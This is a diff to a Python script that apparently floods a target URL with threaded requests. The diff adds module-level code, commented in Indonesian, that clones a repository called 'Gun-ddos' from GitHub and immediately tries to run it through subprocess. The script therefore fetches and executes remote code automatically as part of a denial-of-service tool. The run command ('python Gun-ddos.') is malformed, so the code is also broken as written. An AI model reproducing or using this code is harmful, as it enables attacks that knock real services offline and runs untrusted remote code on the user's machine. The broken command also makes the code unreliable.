@@ -2,7 +2,7 @@ import requests
 import threading
 import time
 import signal
-
+import subprocess
 # ASCII art
 ascii_art = """ 
 
@@ -98,6 +98,27 @@ def send_request_threads(url):
 
     for thread in threads:
         thread.join()
+# Tautan GitHub repositori yang ingin Anda klone
+github_repo_url = "https://github.com/Koboi-kepri/Gun-ddos.git"
+
+# Nama direktori tempat Anda ingin mengkloning repositori
+repo_directory = "Gun-ddos"
+
+# Lakukan git clone
+try:
+    subprocess.run(["git", "clone", github_repo_url, repo_directory])
+    print("Repositori Gun-ddos telah berhasil dikloning.")
+
+    # Setelah mengkloning, Anda dapat menjalankan alat Gun-ddos
+    # Ganti dengan perintah yang sesuai untuk menjalankan alat ini
+    # Misalnya, perintah berikut ini (sesuaikan dengan alat yang sebenarnya):
+    subprocess.run(["python", "Gun-ddos."])
+
+except subprocess.CalledProcessError:
+    print("Terjadi kesalahan saat mencoba mengkloning repositori.")
+except KeyboardInterrupt:
+    print("Dihentikan oleh pengguna.")
+
 
 if __name__ == "__main__":
     main()
